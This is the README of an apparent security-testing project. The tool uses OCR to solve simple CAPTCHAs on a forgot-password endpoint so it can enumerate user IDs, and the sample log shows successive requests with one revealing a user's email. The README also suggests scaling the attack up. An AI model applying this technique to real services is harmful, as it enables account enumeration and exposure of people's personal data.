# CAPTCHA Bypass

This project uses Python3 and the EasyOCR library. It works on simpler CAPTCHAs where an image containing characters is presented and the characters need to be submitted via HTTP to a web service to pass the challenge. Accuracy goes down with more image noise.

This was made super quick and dirty and targets a CAPTCHA-protected forgot password feature. There are few enhancements that could stand to be made:
*  Read a list of usernames from a file, instead of counting down to known userID in a contrived way.
*  Try again if 'CAPTCHA challenge failed' response received, rather than blowing right by.
*  Output could be optimized to only show valid username hits.
*  Could be run from a machine with a dedicated GPU or could potentially take advantage of multi-threading.
*  Additional conditions for corrections when CAPTCHA solutions fail in predictable ways, (line 28)
    *  e.g. "I" is mistaken for pipe char (|), or 
    *  "J" is mistaken for right bracket (]).

Dependencies:
*  EasyOCR - to read text from images
*  pillow - to read image from file
*  requests - to pull down images and to submit follow up challenge answers

Setup:
```
pipenv install pillow easyocr requests
pipenv shell
python3 ./captcha-ocr-bypass.py
```

Example output:<br />
In the output below the application is responding "FAILURE" because the submitted username is invalid, but is also responding "Captcha success" since the CAPTCHA solution was correct. In the final application response, both the username and the CAPTCHA solution are valid.<br />
It may not be obvious that the "\[-\] Captcha processing:" text is the output from EasyOCR that needs trimmed and whitespace removed.

The CAPTCHA challenge image from the final response:<br />
![Final CAPTCHA challange image](https://github.com/andrewantles/captcha-bypass/blob/main/tmp-img_1.jpg)

```
CUDA not available - defaulting to CPU. Note: This module is much faster with a GPU.
[-] Capthca processing: ['M   6 5 U G T']
[-] Captcha solution is: M65UGT
[-] Sending URL: https://[target-domain]/captcha/valid/username?userid=[redacted-ending-in]07&captchastring=M65UGT
[*] Application response: {"status":"FAILURE","info":"Captcha success","email":null}
CUDA not available - defaulting to CPU. Note: This module is much faster with a GPU.
[-] Capthca processing: ['A R B 6 A |']
[-] Captcha solution is: ARB6AI
[-] Sending URL: https://[target-domain]/captcha/valid/username?userid=[redacted-ending-in]06&captchastring=ARB6AI
[*] Application response: {"status":"FAILURE","info":"Captcha success","email":null}
CUDA not available - defaulting to CPU. Note: This module is much faster with a GPU.
[-] Capthca processing: ['J   6 7 G', 'P D']
[-] Captcha solution is: J67GPD
[-] Sending URL: https://[target-domain]/captcha/valid/username?userid=[redacted-ending-in]05&captchastring=J67GPD
[*] Application response: {"status":"FAILURE","info":"Captcha success","email":null}
CUDA not available - defaulting to CPU. Note: This module is much faster with a GPU.
[-] Capthca processing: ['G 4 9 Y T 7']
[-] Captcha solution is: G49YT7
[-] Sending URL: https://[target-domain]/captcha/valid/username?userid=[redacted-ending-in]04&captchastring=G49YT7
[*] Application response: {"status":"FAILURE","info":"Captcha success","email":null}
CUDA not available - defaulting to CPU. Note: This module is much faster with a GPU.
[-] Capthca processing: ['L R  S P W C']
[-] Captcha solution is: LRSPWC
[-] Sending URL: https://[target-domain]/captcha/valid/username?userid=[redacted-ending-in]03&captchastring=LRSPWC
[*] Application response: {"status":"FAILURE","info":"Captcha success","email":null}
CUDA not available - defaulting to CPU. Note: This module is much faster with a GPU.
[-] Capthca processing: ['D 9 3', 'T T S']
[-] Captcha solution is: D93TTS
[-] Sending URL: https://[target-domain]/captcha/valid/username?userid=[redacted-ending-in]02&captchastring=D93TTS
[*] Application response: {"status":"FAILURE","info":"Captcha success","email":null}
CUDA not available - defaulting to CPU. Note: This module is much faster with a GPU.
[-] Capthca processing: ['VR  6 R 6', 'D']
[-] Captcha solution is: VR6R6D
[-] Sending URL: https://[target-domain]/captcha/valid/username?userid=[redacted-ending-in]01&captchastring=VR6R6D
[*] Application response: {"status":"SUCCESS","info":"Captcha success","email":"[redacted]@[user-domain].com"}
```

